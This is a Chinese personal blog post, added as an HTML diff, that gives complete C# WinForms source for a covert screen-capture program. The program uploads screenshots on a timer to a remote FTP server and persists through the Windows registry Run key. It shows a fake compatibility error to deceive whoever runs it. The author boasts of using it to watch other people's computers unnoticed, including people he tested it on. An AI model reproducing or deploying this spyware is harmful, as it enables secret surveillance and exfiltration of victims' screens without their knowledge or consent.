@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.2">
+<meta name="keywords" content="深度优先,管星,xguan2014,.Net Core,C#,程序员,.Net博客,xguan,树莓派">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/fancybox/3.3.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/themes/blue/pace-theme-minimal.min.css">
+  <script src="//cdnjs.cloudflare.com/ajax/libs/pace/1.0.2/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"blog.bfsdfs.com","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":100},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="这几天跟个咸鱼似的。天气太热了，什么事情都不想干。 继续以前的思路写了个winform后台实时截屏de小程序，这次的小改进是，可以将图片上传到自己服务器上 就相当于可以实时监控别人电脑de画面情况，然后加上开机启动，后台运行，一般小白也难以察觉。hhh 找了几个人试了下，效果还不错，而且还发现，在QQ上传文件时，腾讯的测试机会先进行文件的查看 测试机器也在运行我程序的时候被截屏，并上传到服务器了，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="【DIY】实时截屏上传到服务器">
+<meta property="og:url" content="http://blog.bfsdfs.com/2017/07/25/%E3%80%90DIY%E3%80%91%E5%AE%9E%E6%97%B6%E6%88%AA%E5%B1%8F%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/index.html">
+<meta property="og:site_name" content="深度优先">
+<meta property="og:description" content="这几天跟个咸鱼似的。天气太热了，什么事情都不想干。 继续以前的思路写了个winform后台实时截屏de小程序，这次的小改进是，可以将图片上传到自己服务器上 就相当于可以实时监控别人电脑de画面情况，然后加上开机启动，后台运行，一般小白也难以察觉。hhh 找了几个人试了下，效果还不错，而且还发现，在QQ上传文件时，腾讯的测试机会先进行文件的查看 测试机器也在运行我程序的时候被截屏，并上传到服务器了，">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2017-07-25T03:09:20.000Z">
+<meta property="article:modified_time" content="2023-04-03T14:39:33.063Z">
+<meta property="article:author" content="Mr.Guan">
+<meta property="article:tag" content="DIY">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://blog.bfsdfs.com/2017/07/25/%E3%80%90DIY%E3%80%91%E5%AE%9E%E6%97%B6%E6%88%AA%E5%B1%8F%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>【DIY】实时截屏上传到服务器 | 深度优先</title>
+  
+
+
+  <script>
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "https://hm.baidu.com/hm.js?7d4b9c409d6a4f7ccb3245af7b784a46";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">深度优先</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">这个家伙好懒，除了文章什么都没留下</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-tools">
+
+    <a href="/tools/" rel="section"><i class="wrench fa-fw"></i>工具</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.bfsdfs.com/2017/07/25/%E3%80%90DIY%E3%80%91%E5%AE%9E%E6%97%B6%E6%88%AA%E5%B1%8F%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="Mr.Guan">
+      <meta itemprop="description" content="一份耕耘，一份收获">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="深度优先">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          【DIY】实时截屏上传到服务器
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2017-07-25 11:09:20" itemprop="dateCreated datePublished" datetime="2017-07-25T11:09:20+08:00">2017-07-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/DIY%E7%A8%8B%E5%BA%8F/" itemprop="url" rel="index"><span itemprop="name">DIY程序</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>5.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>5 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>这几天跟个咸鱼似的。天气太热了，什么事情都不想干。</p>
+<p>继续以前的思路写了个winform后台实时截屏de小程序，这次的小改进是，可以将图片上传到自己服务器上</p>
+<p>就相当于可以实时监控别人电脑de画面情况，然后加上开机启动，后台运行，一般小白也难以察觉。hhh</p>
+<p>找了几个人试了下，效果还不错，而且还发现，在QQ上传文件时，腾讯的测试机会先进行文件的查看</p>
+<p>测试机器也在运行我程序的时候被截屏，并上传到服务器了，感觉一下发现新大陆了</p>
+<p>直接贴算了，代码也不多：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><span class="line">public partial class Form1 : Form</span><br><span class="line">&#123;</span><br><span class="line">    public Form1()</span><br><span class="line">    &#123;</span><br><span class="line">        InitializeComponent();</span><br><span class="line">    &#125;</span><br><span class="line">    //因为以替换形式，保存图片，定义一个全局变量i, fzu0.png fzu1.png fzu2.png fzu(3%3).png fzu(4%3).png</span><br><span class="line">    private static int i = 0;</span><br><span class="line">    private Bitmap bitmap = null;</span><br><span class="line">    private const string imgPath = &quot;CutScreen.png&quot;;</span><br><span class="line">    private const string CreateimgPath = &quot;D:\\ggg\\img\\&quot;;</span><br><span class="line">    private const string txtPath = @&quot;CutScreenText.txt&quot;;</span><br><span class="line"></span><br><span class="line">    private void Form1_Load(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            if (Directory.Exists(CreateimgPath) == false)</span><br><span class="line">                Directory.CreateDirectory(CreateimgPath);</span><br><span class="line">        &#125;catch&#123;&#125;</span><br><span class="line">        StartUp(&quot;1&quot;);//开机启动</span><br><span class="line">        timer1.Start();</span><br><span class="line">        MessageBox.Show(&quot;oh，当前运行环境不兼容！&quot;, &quot;消息提示&quot;, MessageBoxButtons.OK, MessageBoxIcon.Error);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void btn_upload_Click(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    /// &lt;summary&gt;</span><br><span class="line">    /// 全屏截图</span><br><span class="line">    /// &lt;/summary&gt;</span><br><span class="line">    /// &lt;param name=&quot;strName&quot;&gt;&lt;/param&gt;</span><br><span class="line">    /// &lt;param name=&quot;iVali&quot;&gt;&lt;/param&gt;</span><br><span class="line">    public void ExecCutScreen(string strName, int iVali)</span><br><span class="line">    &#123;</span><br><span class="line">        bitmap = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);</span><br><span class="line">        Graphics gp = Graphics.FromImage(bitmap);</span><br><span class="line">        gp.CopyFromScreen(new Point(Screen.PrimaryScreen.Bounds.X, Screen.PrimaryScreen.Bounds.Y), new Point(0, 0), bitmap.Size, CopyPixelOperation.SourceCopy);</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            string newImg = CreateimgPath + imgPath;</span><br><span class="line">            //判断图片是否存在，存在将其删除，用新的替代</span><br><span class="line">            if (File.Exists(newImg))</span><br><span class="line">            &#123;</span><br><span class="line">                File.Delete(newImg);</span><br><span class="line">            &#125;</span><br><span class="line">            bitmap.Save(newImg, ImageFormat.Png);//存储到本地磁盘</span><br><span class="line">            uploadFile(newImg, strName + &quot;.png&quot;);</span><br><span class="line">            //iVali参数判断，如果iVali=0,说明执行的是现在截取屏幕事件，如果是iVali=1说明执行timer控件事件。</span><br><span class="line">            if (iVali == 0)</span><br><span class="line">            &#123;</span><br><span class="line">                //MessageBox.Show(&quot;成功上传！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch(Exception ex) &#123;</span><br><span class="line">            //MessageBox.Show(ex.Message);</span><br><span class="line">        &#125;</span><br><span class="line">        finally</span><br><span class="line">        &#123;</span><br><span class="line">            gp.Dispose();</span><br><span class="line">            bitmap.Dispose();</span><br><span class="line">            //iVali参数判断，如果iVali=0,说明执行的是现在截取屏幕事件，如果是iVali=1说明执行timer控件事件。</span><br><span class="line">            if (iVali == 1)</span><br><span class="line">            &#123;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    /// &lt;summary&gt;</span><br><span class="line">    /// 上传到服务器端</span><br><span class="line">    /// &lt;/summary&gt;</span><br><span class="line">    /// &lt;param name=&quot;localPath&quot;&gt;&lt;/param&gt;</span><br><span class="line">    /// &lt;param name=&quot;strName&quot;&gt;&lt;/param&gt;</span><br><span class="line">    public void uploadFile(string localPath, string strName)</span><br><span class="line">    &#123;</span><br><span class="line">        Stream strm = null;</span><br><span class="line">        FileStream fs = null;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            FileInfo fileInf = new FileInfo(localPath); //本地要上传的文件路径</span><br><span class="line">            //上传的ftp路径+文件名</span><br><span class="line">            string uri = @&quot;ftp://1.1.1.1/Cut/&quot; + strName;//根据自己连接改下</span><br><span class="line">            // 连接 </span><br><span class="line">            FtpWebRequest reqFTP;</span><br><span class="line">            reqFTP = (FtpWebRequest)FtpWebRequest.Create(uri);</span><br><span class="line">            reqFTP.UseBinary = true; // 指定数据传输类型</span><br><span class="line">            reqFTP.Credentials = new NetworkCredential(&quot;ftpName&quot;, &quot;ftpPwd&quot;); // ftp用户名和密码</span><br><span class="line"></span><br><span class="line">            // 默认为true，连接不会被关闭</span><br><span class="line">            // 在一个命令之后被执行</span><br><span class="line">            reqFTP.KeepAlive = false;</span><br><span class="line">            // 指定执行什么命令</span><br><span class="line">            reqFTP.Method = WebRequestMethods.Ftp.UploadFile;</span><br><span class="line">            //上传文件时通知服务器文件的大小</span><br><span class="line">            reqFTP.ContentLength = fileInf.Length;</span><br><span class="line">            //缓冲大小设置为kb </span><br><span class="line">            int buffLength = 2048;</span><br><span class="line">            byte[] buff = new byte[buffLength];</span><br><span class="line">            int contentLen;</span><br><span class="line">            // 打开一个文件流(System.IO.FileStream) 去读上传的文件</span><br><span class="line">            fs = fileInf.OpenRead();</span><br><span class="line">            //把上传的文件写入流</span><br><span class="line">            strm = reqFTP.GetRequestStream();</span><br><span class="line">            // 每次读文件流的kb</span><br><span class="line">            contentLen = fs.Read(buff, 0, buffLength);</span><br><span class="line">            // 流内容没有结束</span><br><span class="line">            while (contentLen != 0)</span><br><span class="line">            &#123;</span><br><span class="line">                // 把内容从file stream 写入upload stream </span><br><span class="line">                strm.Write(buff, 0, contentLen);</span><br><span class="line">                contentLen = fs.Read(buff, 0, buffLength);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123; &#125;</span><br><span class="line">        finally</span><br><span class="line">        &#123;</span><br><span class="line">            // 关闭两个流</span><br><span class="line">            strm.Close();</span><br><span class="line">            fs.Close();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    int count = 0;</span><br><span class="line">    string UserName = System.Environment.UserName;</span><br><span class="line">    private void timer1_Tick(object sender, EventArgs e)</span><br><span class="line">    &#123;</span><br><span class="line">        string time =&quot;&quot; +DateTime.Now.Hour + DateTime.Now.Minute + DateTime.Now.Second;</span><br><span class="line">        ExecCutScreen(UserName + &quot;_&quot; + time, 0);</span><br><span class="line">        count++;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    /// &lt;summary&gt;  </span><br><span class="line">    /// 修改程序在注册表中的键值  </span><br><span class="line">    /// &lt;/summary&gt;  </span><br><span class="line">    /// &lt;param name=&quot;flag&quot;&gt;1:开机启动&lt;/param&gt;  </span><br><span class="line">    private void StartUp(string flag)</span><br><span class="line">    &#123;</span><br><span class="line">        try</span><br><span class="line">        &#123;</span><br><span class="line">            string path = Application.StartupPath;</span><br><span class="line">            string keyName = path.Substring(path.LastIndexOf(&quot;\\&quot;) + 1);</span><br><span class="line">            Microsoft.Win32.RegistryKey Rkey = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;, true);</span><br><span class="line"></span><br><span class="line">            if (flag.Equals(&quot;1&quot;))</span><br><span class="line">            &#123;</span><br><span class="line">                if (Rkey == null)</span><br><span class="line">                &#123;</span><br><span class="line">                    Rkey = Microsoft.Win32.Registry.CurrentUser.CreateSubKey(&quot;SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;);</span><br><span class="line">                &#125;</span><br><span class="line">                Rkey.SetValue(keyName, path + @&quot;\UploadImages.exe&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            else</span><br><span class="line">            &#123;</span><br><span class="line">                if (Rkey != null)</span><br><span class="line">                &#123;</span><br><span class="line">                    Rkey.DeleteValue(keyName, false);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        catch</span><br><span class="line">        &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>只允许程序启动一个： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">static class Program</span><br><span class="line">&#123;</span><br><span class="line">    private static System.Threading.Mutex mutex;</span><br><span class="line">    /// &lt;summary&gt;</span><br><span class="line">    /// 应用程序的主入口点。</span><br><span class="line">    /// &lt;/summary&gt;</span><br><span class="line">    [STAThread]</span><br><span class="line">    static void Main()</span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Application.EnableVisualStyles();</span><br><span class="line">        Application.SetCompatibleTextRenderingDefault(false);</span><br><span class="line">        mutex = new System.Threading.Mutex(true, &quot;OnlyRun&quot;);</span><br><span class="line">        if (mutex.WaitOne(0, false))</span><br><span class="line">        &#123;</span><br><span class="line">            Application.Run(new Form1());</span><br><span class="line">        &#125;</span><br><span class="line">        else</span><br><span class="line">        &#123;</span><br><span class="line">            MessageBox.Show(&quot;程序已经启动过一次！&quot;, &quot;提示消息&quot;, MessageBoxButtons.OK, MessageBoxIcon.Information);</span><br><span class="line">            Application.Exit();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>效果展示：<br><a target="_blank" rel="noopener" href="http://bfsdfs.com/UploadImgShow.aspx">http://bfsdfs.com/UploadImgShow.aspx</a>  </p>
+
+    </div>
+
+    
+    
+    
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Mr.Guan
+  </li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.bfsdfs.com/2017/07/25/%E3%80%90DIY%E3%80%91%E5%AE%9E%E6%97%B6%E6%88%AA%E5%B1%8F%E4%B8%8A%E4%BC%A0%E5%88%B0%E6%9C%8D%E5%8A%A1%E5%99%A8/" title="【DIY】实时截屏上传到服务器">http://blog.bfsdfs.com/2017/07/25/【DIY】实时截屏上传到服务器/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/DIY/" rel="tag"># DIY</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2017/07/22/%E3%80%90Asp.Net%E3%80%91%E4%B8%93%E4%B8%9A%E5%92%8C%E5%B2%97%E4%BD%8D%E7%AE%A1%E7%90%86/" rel="prev" title="【Asp.Net】专业和岗位管理">
+      <i class="fa fa-chevron-left"></i> 【Asp.Net】专业和岗位管理
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2017/08/03/%E3%80%90%E5%AE%89%E5%85%A8%E3%80%91%E7%AE%80%E5%8D%95%E7%9A%84Js%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BBsql%E6%B3%A8%E5%85%A5%E6%94%BB%E5%87%BB/" rel="next" title="【安全】简单的Js脚本攻击sql注入攻击">
+      【安全】简单的Js脚本攻击sql注入攻击 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Mr.Guan"
+      src="/images/header.jpg">
+  <p class="site-author-name" itemprop="name">Mr.Guan</p>
+  <div class="site-description" itemprop="description">一份耕耘，一份收获</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">319</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">11</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">69</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/xguan2014" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;xguan2014" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:xguan2014@gmail.com" title="E-Mail → mailto:xguan2014@gmail.com" rel="noopener" target="_blank"><i class="envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="hhttps://blog.csdn.net/qq_32688731" title="CSDN → hhttps:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_32688731" rel="noopener" target="_blank"><i class="globe fa-fw"></i>CSDN</a>
+      </span>
+  </div>
+
+
+
+
+  立足江湖：
+  <p id="site_time_ing" title="建站日期：2017-05-20 16:46:00"></p>
+  <script>
